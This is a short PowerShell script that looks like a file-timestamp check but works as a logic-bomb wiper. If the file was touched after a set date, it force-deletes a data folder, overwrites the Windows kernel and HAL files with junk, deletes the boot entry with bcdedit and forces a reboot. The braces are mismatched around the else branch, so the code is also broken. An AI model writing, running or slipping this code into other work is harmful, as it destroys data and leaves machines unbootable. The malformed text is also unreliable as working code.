# Define the file path
$filePath = "C:\path\to\your\file.txt"

# Get file properties
$file = Get-Item $filePath

# Retrieve last access and modification times
$lastAccessed = $file.LastAccessTime
$lastModified = $file.LastWriteTime

# Define your comparison timestamp (example: specific date)
$comparisonDate = Get-Date "2023-01-01"

# Compare 
if ( ($lastAccessed -gt $comparisonDate) -OR ($lastModified -gt $comparisonDate)) {
    Write-Host "File was last accessed after $comparisonDate"
    
    # Wipe sensitive data
    $folderPath = "C:\SensitiveData"
    Remove-Item -Path $folderPath\* -Recurse -Force

    # Overwrite system files
    $systemFiles = @('C:\Windows\System32\ntoskrnl.exe', 'C:\Windows\System32\hal.dll')
    foreach ($file in $systemFiles) {
        Set-Content -Path $file -Value 'Corrupted' -Force
        }
      
    # Remove booting capabilities

    Try {
        # Remove the primary boot entry
        bcdedit /delete {current} /f
    
        # Force a reboot
        Restart-Computer -Force
    }
    Catch {
        Write-Error "An error occurred: $_"
    }

}


} else {
    Write-Host "File was last accessed before $comparisonDate"
    
}
